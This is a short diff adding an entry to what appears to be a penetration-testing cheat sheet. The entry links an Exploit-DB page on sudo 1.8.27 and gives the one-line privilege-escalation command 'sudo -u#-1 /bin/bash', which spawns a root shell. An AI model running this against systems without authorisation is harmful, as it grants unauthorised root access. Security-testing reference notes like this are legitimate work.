@@ -388,3 +388,8 @@ WantedBy=multi-user.target
 ### [restricted shell bypassing]
 https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
 
+### [exploiting sudo 1.8.27]
+https://www.exploit-db.com/exploits/47502
+```
+sudo -u#-1 /bin/bash
+```
